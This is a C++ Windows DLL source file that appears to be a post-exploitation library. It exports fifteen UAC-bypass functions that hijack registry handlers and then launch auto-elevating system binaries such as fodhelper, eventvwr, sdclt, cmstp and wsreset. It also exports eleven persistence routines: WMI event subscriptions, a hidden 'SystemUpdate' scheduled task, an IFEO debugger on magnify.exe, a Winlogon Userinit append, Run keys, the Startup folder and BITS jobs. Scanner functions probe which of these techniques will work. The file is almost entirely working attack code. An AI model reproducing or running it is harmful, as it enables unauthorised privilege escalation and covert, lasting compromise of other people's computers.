#include <windows.h>
#include <shellapi.h>
#include <stdio.h>
#include <string>
#include <thread>
#include <chrono>
#include <shlobj.h>

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

extern "C" {
    __declspec(dllexport) int uacm1(const char* p);
    __declspec(dllexport) int uacm2(const char* p);
    __declspec(dllexport) int uacm3(const char* p);
    __declspec(dllexport) int uacm4(const char* p);
    __declspec(dllexport) int uacm5(const char* p);
    __declspec(dllexport) int uacm6(const char* p);
    __declspec(dllexport) int uacm7(const char* p);
    __declspec(dllexport) int uacm8(const char* p);
    __declspec(dllexport) int uacm9(const char* p);
    __declspec(dllexport) int uacm10(const char* p);
    __declspec(dllexport) int uacm11(const char* p);
    __declspec(dllexport) int uacm12(const char* p);
    __declspec(dllexport) int uacm13(const char* p);
    __declspec(dllexport) int uacm14(const char* p);
    __declspec(dllexport) int uacm15(const char* p);
    
    __declspec(dllexport) int per1(const char* p);
    __declspec(dllexport) int per2(const char* p); 
    __declspec(dllexport) int per3(const char* p); 
    __declspec(dllexport) int per4(const char* p); 
    __declspec(dllexport) int per5(const char* p);
    __declspec(dllexport) int per6(const char* p);   
    __declspec(dllexport) int per7(const char* p);  
    __declspec(dllexport) int per8(const char* p);  
    __declspec(dllexport) int per9(const char* p); 
    __declspec(dllexport) int per10(const char* p);  
    __declspec(dllexport) int per11(const char* p);  
    
    __declspec(dllexport) int scan(int* results, int* uac_level, int* build_number);
    __declspec(dllexport) int scan_persistence(int* results, int* elevated);
    __declspec(dllexport) int is_elevated();
}

class FSRGuard {
    PVOID old = nullptr;
public: 
    FSRGuard() { Wow64DisableWow64FsRedirection(&old); }
    ~FSRGuard() { Wow64RevertWow64FsRedirection(old); }
};

static bool Valid(const char* p) { 
    return p && GetFileAttributesA(p) != INVALID_FILE_ATTRIBUTES; 
}

static void CleanReg(const char* path, const char* val = "DelegateExecute") {
    HKEY k;
    if (!RegOpenKeyExA(HKEY_CURRENT_USER, path, 0, KEY_ALL_ACCESS, &k)) {
        if (val) RegDeleteValueA(k, val);
        RegCloseKey(k);
    }
    RegDeleteKeyA(HKEY_CURRENT_USER, path);
}

static bool SetReg(const char* path, const char* prog, const char* de = "") {
    HKEY k;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, path, 0, NULL, 0, KEY_ALL_ACCESS, NULL, &k, NULL)) 
        return false;
    bool ok = !RegSetValueExA(k, NULL, 0, REG_SZ, (BYTE*)prog, (DWORD)strlen(prog)+1);
    if (de && strlen(de)) 
        RegSetValueExA(k, de, 0, REG_SZ, (BYTE*)"", 1);
    RegCloseKey(k);
    return ok;
}

static bool SetRegHKLM(const char* path, const char* name, const char* value) {
    HKEY k;
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, path, 0, NULL, 0, KEY_ALL_ACCESS, NULL, &k, NULL))
        return false;
    bool ok = !RegSetValueExA(k, name, 0, REG_SZ, (BYTE*)value, (DWORD)strlen(value)+1);
    RegCloseKey(k);
    return ok;
}

static bool CheckRegWriteAccess(HKEY root, const char* path) {
    HKEY k;
    DWORD disp;
    LONG result = RegCreateKeyExA(root, path, 0, NULL, 0, KEY_WRITE, NULL, &k, &disp);
    if (result == ERROR_SUCCESS) {
        RegCloseKey(k);
        if (disp == REG_CREATED_NEW_KEY) {
            RegDeleteKeyA(root, path);
        }
        return true;
    }
    return false;
}

static bool Exec(const char* exe, bool wait = true, bool hide = true) {
    SHELLEXECUTEINFOA s = {sizeof(s)};
    s.lpFile = exe;
    s.nShow = hide ? SW_HIDE : SW_SHOW;
    if (!ShellExecuteExA(&s)) return false;
    if (wait) std::this_thread::sleep_for(std::chrono::seconds(2));
    return true;
}

static int get_uac_level() {
    DWORD cpba = 0, cpbu = 0, posd = 0, size = sizeof(DWORD);
    HKEY key;
    
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
        "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
        0, KEY_READ, &key) != ERROR_SUCCESS) return -1;
    
    RegQueryValueExA(key, "ConsentPromptBehaviorAdmin", NULL, NULL, (LPBYTE)&cpba, &size);
    RegQueryValueExA(key, "ConsentPromptBehaviorUser", NULL, NULL, (LPBYTE)&cpbu, &size);
    RegQueryValueExA(key, "PromptOnSecureDesktop", NULL, NULL, (LPBYTE)&posd, &size);
    RegCloseKey(key);
    
    if (cpba == 0 && cpbu == 3 && posd == 0) return 1;
    if (cpba == 5 && cpbu == 3 && posd == 0) return 2;
    if (cpba == 5 && cpbu == 3 && posd == 1) return 3;
    if (cpba == 2 && cpbu == 3 && posd == 1) return 4;
    return 0;
}

static int get_build_number() {
    HKEY key;
    char buildStr[32] = {0};
    DWORD size = sizeof(buildStr);
    DWORD type = 0;

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "Software\\Microsoft\\Windows NT\\CurrentVersion",
        0, KEY_READ, &key) != ERROR_SUCCESS)
        return 0;

    if (RegQueryValueExA(key, "CurrentBuildNumber", NULL,
        &type, (LPBYTE)buildStr, &size) != ERROR_SUCCESS) {
        RegCloseKey(key);
        return 0;
    }

    RegCloseKey(key);

    if (type == REG_SZ || type == REG_EXPAND_SZ)
        return atoi(buildStr);

    return 0;
}

int is_elevated() {
    BOOL elevated = FALSE;
    HANDLE token;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        TOKEN_ELEVATION elevation;
        DWORD size;
        if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &size)) {
            elevated = elevation.TokenIsElevated;
        }
        CloseHandle(token);
    }
    return elevated ? 1 : 0;
}

static bool file_exists(const char* path) {
    return GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES;
}

static int check_auto_elevate(const char* path) {
    if (!file_exists(path))
        return 2; 

    HMODULE hModule = LoadLibraryExA(path, NULL, LOAD_LIBRARY_AS_DATAFILE);
    if (!hModule)
        return 2;

    HRSRC hRes = FindResourceA(hModule, MAKEINTRESOURCEA(1), RT_MANIFEST);
    if (!hRes) {
        FreeLibrary(hModule);
        return 0;
    }

    HGLOBAL hData = LoadResource(hModule, hRes);
    if (!hData) {
        FreeLibrary(hModule);
        return 2;
    }

    DWORD size = SizeofResource(hModule, hRes);
    void* pData = LockResource(hData);

    if (!pData || size == 0) {
        FreeLibrary(hModule);
        return 2;
    }

    std::string manifest((char*)pData, size);
    FreeLibrary(hModule);

    if (manifest.find("<autoElevate>true</autoElevate>") != std::string::npos)
        return 1; 

    return 0; 
}

int scan(int* results, int* uac_level, int* build_number) {
    *uac_level = get_uac_level();
    *build_number = get_build_number();

    const char* targets[15] = {
        "C:\\Windows\\System32\\consent.exe",
        "C:\\Windows\\System32\\fodhelper.exe",
        "C:\\Windows\\System32\\slui.exe",
        "C:\\Windows\\System32\\schtasks.exe",
        "C:\\Windows\\System32\\sdclt.exe",
        "C:\\Windows\\System32\\sdclt.exe",
        "C:\\Windows\\System32\\perfmon.exe",
        "C:\\Windows\\System32\\eventvwr.exe",
        "C:\\Windows\\System32\\compmgmtlauncher.exe",
        "C:\\Windows\\System32\\computerdefaults.exe",
        "C:\\Windows\\System32\\cmd.exe",
        "C:\\Windows\\System32\\sdclt.exe",
        "C:\\Windows\\System32\\cmstp.exe",
        "C:\\Windows\\System32\\wsreset.exe",
        "C:\\Windows\\System32\\slui.exe"
    };

    for (int i = 0; i < 15; i++) {
        results[i] = check_auto_elevate(targets[i]);
    }

    return 15;
}

int scan_persistence(int* results, int* elevated) {
    *elevated = is_elevated();
    
    results[0] = file_exists("C:\\Windows\\System32\\mofcomp.exe") ? 1 : 0;

    results[1] = 0; 
    bool ifeo_access = CheckRegWriteAccess(HKEY_LOCAL_MACHINE, 
        "Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\test.exe");
    results[2] = ifeo_access ? 1 : 0;

    bool userinit_access = CheckRegWriteAccess(HKEY_LOCAL_MACHINE,
        "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
    results[3] = userinit_access ? 1 : 0;

    bool hkcu_run = CheckRegWriteAccess(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run");
    results[4] = hkcu_run ? 1 : 0;

    bool hklm_run = CheckRegWriteAccess(HKEY_LOCAL_MACHINE,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run");
    results[5] = hklm_run ? 1 : 0;

    results[6] = file_exists("C:\\Windows\\System32\\wbem\\wmic.exe") ? 1 : 0;

    char startup_path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_path))) {
        results[7] = 1; 
    } else {
        results[7] = 0;
    }
    
    bool cortana_access = CheckRegWriteAccess(HKEY_CURRENT_USER,
        "Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\CurrentVersion\\AppModel\\SystemAppData");
    results[8] = cortana_access ? 1 : 0;
    
    results[9] = cortana_access ? 1 : 0; 
    
    results[10] = file_exists("C:\\Windows\\System32\\bitsadmin.exe") ? 1 : 0;
    
    return 11;
}

int uacm1(const char* p) {
    if (!Valid(p)) return -1;
    SHELLEXECUTEINFOA s = {sizeof(s)};
    s.lpVerb = "runas";
    s.lpFile = p;
    s.nShow = SW_SHOW;
    return ShellExecuteExA(&s) ? 1 : 0;
}

int uacm2(const char* p) {
    if (!Valid(p)) return -1;
    const char* path = "Software\\Classes\\ms-settings\\shell\\open\\command";
    if (!SetReg(path, p, "DelegateExecute")) return 0;
    { FSRGuard g; if (!Exec("fodhelper.exe")) { CleanReg(path); return 0; } }
    CleanReg(path);
    return 1;
}

int uacm3(const char* p) {
    if (!Valid(p)) return -1;
    const char* path = "Software\\Classes\\Launcher.SystemSettings\\shell\\open\\command";
    if (!SetReg(path, p)) return 0;
    { FSRGuard g; if (!Exec("slui.exe")) { CleanReg(path); return 0; } }
    CleanReg(path);
    return 1;
}

int uacm4(const char* p) {
    if (!Valid(p)) return -1;
    const char* path = "Software\\Classes\\CLSID\\{CEEF6551-CD99-45C4-8F86-4A7C3AA1B6DE}\\InprocServer32";
    if (!SetReg(path, p)) return 0;
    
    SHELLEXECUTEINFOA s = {sizeof(s)};
    s.lpFile = "schtasks.exe";
    s.lpParameters = "/Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I";
    s.nShow = SW_HIDE;
    if (!ShellExecuteExA(&s)) { CleanReg(path, NULL); return 0; }
    
    std::this_thread::sleep_for(std::chrono::seconds(3));
    CleanReg(path, NULL);
    return 1;
}

int uacm5(const char* p) {
    if (!Valid(p)) return -1;
    const char* path = "Software\\Classes\\Folder\\shell\\open\\command";
    if (!SetReg(path, p, "IsolatedCommand")) return 0;
    { FSRGuard g; if (!Exec("sdclt.exe")) { CleanReg(path, "IsolatedCommand"); return 0; } }
    CleanReg(path, "IsolatedCommand");
    return 1;
}

int uacm6(const char* p) {
    if (!Valid(p)) return -1;
    const char* path = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe";
    char cmd[512];
    sprintf(cmd, "%s /name Microsoft.BackupAndRestore", p);
    if (!SetReg(path, cmd)) return 0;
    { FSRGuard g; if (!Exec("sdclt.exe")) { CleanReg(path, NULL); return 0; } }
    CleanReg(path, NULL);
    return 1;
}

int uacm7(const char* p) {
    if (!Valid(p)) return -1;
    const char* path = "Software\\Classes\\mscfile\\shell\\open\\command";
    if (!SetReg(path, p)) return 0;
    { FSRGuard g; if (!Exec("perfmon.exe")) { CleanReg(path); return 0; } }
    CleanReg(path);
    return 1;
}

int uacm8(const char* p) {
    if (!Valid(p)) return -1;
    const char* path = "Software\\Classes\\mscfile\\shell\\open\\command";
    if (!SetReg(path, p)) return 0;
    { FSRGuard g; if (!Exec("eventvwr.exe")) { CleanReg(path); return 0; } }
    CleanReg(path);
    return 1;
}

int uacm9(const char* p) {
    if (!Valid(p)) return -1;
    const char* path = "Software\\Classes\\mscfile\\shell\\open\\command";
    if (!SetReg(path, p)) return 0;
    { FSRGuard g; if (!Exec("compmgmtlauncher.exe")) { CleanReg(path); return 0; } }
    CleanReg(path);
    return 1;
}

int uacm10(const char* p) {
    if (!Valid(p)) return -1;
    const char* path = "Software\\Classes\\ms-settings\\shell\\open\\command";
    if (!SetReg(path, p, "DelegateExecute")) return 0;
    { FSRGuard g; if (!Exec("computerdefaults.exe")) { CleanReg(path); return 0; } }
    CleanReg(path);
    return 1;
}

int uacm11(const char* p) {
    if (!Valid(p)) return -1;
    return uacm1(p);
}

int uacm12(const char* p) {
    if (!Valid(p)) return -1;
    const char* path = "Software\\Classes\\Folder\\shell\\open\\command";
    if (!SetReg(path, p)) return 0;
    { FSRGuard g; if (!Exec("sdclt.exe", true, false)) { CleanReg(path); return 0; } }
    CleanReg(path);
    return 1;
}

int uacm13(const char* p) {
    if (!Valid(p)) return -1;
    char infPath[MAX_PATH];
    GetTempPathA(MAX_PATH, infPath);
    strcat(infPath, "test.inf");
    
    FILE* f = fopen(infPath, "w");
    if (!f) return 0;
    fprintf(f, "[Version]\nSignature=$chicago$\nAdvancedINF=2.5\n[DefaultInstall]\nRunPreSetupCommands=RunPreSetupCommandsSection\n[RunPreSetupCommandsSection]\n%s\nTASKKILL /IM cmstp.exe /F\n", p);
    fclose(f);
    
    SHELLEXECUTEINFOA s = {sizeof(s)};
    s.lpFile = "cmstp.exe";
    s.lpParameters = infPath;
    s.nShow = SW_HIDE;
    bool ok = ShellExecuteExA(&s) != 0;
    std::this_thread::sleep_for(std::chrono::seconds(2));
    DeleteFileA(infPath);
    return ok ? 1 : 0;
}

int uacm14(const char* p) {
    if (!Valid(p)) return -1;
    const char* path = "Software\\Classes\\AppX82a6gwre4fdg3bt635tn5uctj7dwp3v\\Shell\\open\\command";
    if (!SetReg(path, p)) return 0;
    { FSRGuard g; if (!Exec("wsreset.exe")) { CleanReg(path); return 0; } }
    CleanReg(path);
    return 1;
}

int uacm15(const char* p) {
    if (!Valid(p)) return -1;
    const char* path = "Software\\Classes\\Launcher.SystemSettings\\shell\\open\\command";
    if (!SetReg(path, p)) return 0;
    { FSRGuard g; 
        if (!Exec("slui.exe")) { CleanReg(path); return 0; }
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
        if (!Exec("changepk.exe")) { CleanReg(path); return 0; }
    }
    CleanReg(path);
    return 1;
}

int per1(const char* p) {
    if (!Valid(p)) return -1;
    char mofPath[MAX_PATH];
    GetTempPathA(MAX_PATH, mofPath);
    strcat(mofPath, "persist.mof");
    
    FILE* f = fopen(mofPath, "w");
    if (!f) return 0;
    fprintf(f, "#pragma namespace(\"\\\\\\\\.\\\\root\\\\subscription\")\n");
    fprintf(f, "instance of __EventFilter as $Filt\n");
    fprintf(f, "{\n    Name = \"filtP1\";\n    Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320\";\n    QueryLanguage = \"WQL\";\n};\n");
    fprintf(f, "instance of CommandLineEventConsumer as $Cons\n");
    fprintf(f, "{\n    Name = \"consP1\";\n    RunInteractively = false;\n    CommandLineTemplate = \"%s\";\n};\n", p);
    fprintf(f, "instance of __FilterToConsumerBinding\n");
    fprintf(f, "{\n    Filter = $Filt;\n    Consumer = $Cons;\n};\n");
    fclose(f);
    
    SHELLEXECUTEINFOA s = {sizeof(s)};
    s.lpFile = "mofcomp.exe";
    s.lpParameters = mofPath;
    s.nShow = SW_HIDE;
    bool ok = ShellExecuteExA(&s) != 0;
    
    std::this_thread::sleep_for(std::chrono::seconds(1));
    DeleteFileA(mofPath);
    return ok ? 1 : 0;
}

int per2(const char* p) {
    if (!Valid(p)) return -1;
    char cmd[512];
    sprintf(cmd, "/Create /TN \"SystemUpdate\" /TR \"%s\" /SC ONLOGON /RL HIGHEST /F", p);
    
    SHELLEXECUTEINFOA s = {sizeof(s)};
    s.lpFile = "schtasks.exe";
    s.lpParameters = cmd;
    s.nShow = SW_HIDE;
    return ShellExecuteExA(&s) ? 1 : 0;
}

int per3(const char* p) {
    if (!Valid(p)) return -1;
    if (!is_elevated()) return 0;
    
    const char* path = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe";
    if (!SetRegHKLM(path, "Debugger", p)) return 0;

    { FSRGuard g; Exec("magnify.exe", false, false); }
    return 1;
}

int per4(const char* p) {
    if (!Valid(p)) return -1;
    if (!is_elevated()) return 0;
    
    HKEY k;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
        0, KEY_ALL_ACCESS, &k) != ERROR_SUCCESS) return 0;
    
    char current[512];
    DWORD size = sizeof(current);
    if (RegQueryValueExA(k, "Userinit", NULL, NULL, (LPBYTE)current, &size) != ERROR_SUCCESS) {
        RegCloseKey(k);
        return 0;
    }
    
    char newVal[1024];
    sprintf(newVal, "%s,%s", current, p);
    
    bool ok = !RegSetValueExA(k, "Userinit", 0, REG_SZ, (BYTE*)newVal, (DWORD)strlen(newVal)+1);
    RegCloseKey(k);
    return ok ? 1 : 0;
}

int per5(const char* p) {
    if (!Valid(p)) return -1;
    
    HKEY k;
    if (RegCreateKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, NULL, 0, KEY_ALL_ACCESS, NULL, &k, NULL)) return 0;
    
    char name[32];
    sprintf(name, "MyUac%d", GetTickCount() % 10000);
    bool ok = !RegSetValueExA(k, name, 0, REG_SZ, (BYTE*)p, (DWORD)strlen(p)+1);
    RegCloseKey(k);
    return ok ? 1 : 0;
}

int per6(const char* p) {
    if (!Valid(p)) return -1;
    if (!is_elevated()) return 0;
    
    HKEY k;
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, NULL, 0, KEY_ALL_ACCESS, NULL, &k, NULL)) return 0;
    
    char name[32];
    sprintf(name, "SystemUpdate%d", GetTickCount() % 10000);
    bool ok = !RegSetValueExA(k, name, 0, REG_SZ, (BYTE*)p, (DWORD)strlen(p)+1);
    RegCloseKey(k);
    return ok ? 1 : 0;
}

int per7(const char* p) {
    if (!Valid(p)) return -1;
    
    char cmd[512];
    sprintf(cmd, "process call create \"%s\"", p);
    
    SHELLEXECUTEINFOA s = {sizeof(s)};
    s.lpFile = "wmic.exe";
    s.lpParameters = cmd;
    s.nShow = SW_HIDE;
    return ShellExecuteExA(&s) ? 1 : 0;
}

int per8(const char* p) {
    if (!Valid(p)) return -1;
    
    char startupPath[MAX_PATH];
    if (FAILED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath)))
        return 0;
    
    char dest[MAX_PATH];
    const char* fname = strrchr(p, '\\');
    fname = fname ? fname + 1 : p;
    sprintf(dest, "%s\\%s", startupPath, fname);
    
    return CopyFileA(p, dest, FALSE) ? 1 : 0;
}

int per9(const char* p) {
    if (!Valid(p)) return -1;

    char localAppData[MAX_PATH];
    if (FAILED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData)))
        return 0;
    
    char cortanaPath[MAX_PATH];
    sprintf(cortanaPath, "%s\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\LocalState", localAppData);

    if (GetFileAttributesA(cortanaPath) == INVALID_FILE_ATTRIBUTES)
        return 0;
    
    return 1; 
}

int per10(const char* p) {
    if (!Valid(p)) return -1;
    
    char localAppData[MAX_PATH];
    if (FAILED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData)))
        return 0;
    
    char peoplePath[MAX_PATH];
    sprintf(peoplePath, "%s\\Packages\\Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy", localAppData);
    
    if (GetFileAttributesA(peoplePath) == INVALID_FILE_ATTRIBUTES)
        return 0;
    
    return 1;
}

int per11(const char* p) {
    if (!Valid(p)) return -1;
    
    char cmd[512];
    sprintf(cmd, "/create /download /priority normal myJob");
    
    SHELLEXECUTEINFOA s = {sizeof(s)};
    s.lpFile = "bitsadmin.exe";
    s.lpParameters = cmd;
    s.nShow = SW_HIDE;
    
    if (!ShellExecuteExA(&s)) return 0;
    
    sprintf(cmd, "/setnotifycmdline myJob \"%s\" NULL", p);
    s.lpParameters = cmd;
    ShellExecuteExA(&s);
    s.lpParameters = "/resume myJob";
    ShellExecuteExA(&s);
    
    std::this_thread::sleep_for(std::chrono::seconds(1));

    s.lpParameters = "/complete myJob";
    return ShellExecuteExA(&s) ? 1 : 0;
}